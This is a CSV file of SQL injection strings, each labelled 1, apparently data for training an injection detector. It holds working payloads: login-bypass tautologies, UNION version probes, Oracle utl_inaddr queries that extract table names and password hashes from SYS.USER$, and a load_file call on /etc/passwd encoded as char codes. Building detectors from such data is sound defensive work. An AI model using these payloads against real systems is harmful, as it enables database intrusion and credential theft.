,Sentence,Label
0,""" or pg_sleep  (  __TIME__  )  --",1
2," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
3," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1
4," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1
5, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1
6,select * from users where id  =  1 +$+ or 1  =  1 -- 1,1
7,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
8," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1
9," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1
10,? or 1  =  1 --,1
11, )   or   (  'a'  =  'a,1
12,admin' or 1  =  1#,1
13," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1
14,or 1  =  1 --,1
15," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
16," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1
17," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1
18," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1
19,distinct,1
20,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1
21,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
22,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1
23,"admin"" or ""1""  =  ""1""--",1
24," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1
25,insert,1
26," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1
27," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1
28," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
29," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1
30,"or 1  =  1 or """"  =  ",1
31,/**/or/**/1/**/  =  /**/1,1
32," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1
33," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1
34," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1
35,or 1  =  1/*,1
36,%27 or 1  =  1,1
37," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1
